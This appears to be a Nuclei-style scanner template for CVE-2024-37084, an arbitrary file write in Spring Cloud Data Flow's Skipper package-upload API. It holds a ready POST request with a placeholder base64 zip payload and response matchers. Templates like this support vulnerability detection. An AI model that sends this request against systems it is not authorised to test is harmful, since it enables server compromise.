id: spring-cloud-data-flow-arbitrary-file-write

info:
  name: Spring Cloud Data Flow Arbitrary File Write
  author: Machevalia
  severity: high
  description: |
    Spring Cloud Data Flow versions prior to 2.11.4 are vulnerable to arbitrary file writes. A malicious user with access to the Skipper server API can craft an upload request to write an arbitrary file to any location on the file system, leading to a potential server compromise.
  tags: rce, arbitrary-file-write, spring-cloud, java
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-37084
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-37084

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/package/upload"

    body: |
      {
        "repoName": "local",
        "name": "thePoc",
        "version": "4.0.0",
        "extension": "zip",
        "packageFileAsBytes": "{{Base64ZipFile}}"
      }

    headers:
      Content-Type: application/json

    matchers:
      - type: status
        status:
          - 200
          - 201
          - 204

      - type: word
        words:
          - "uploaded successfully"
        condition: or
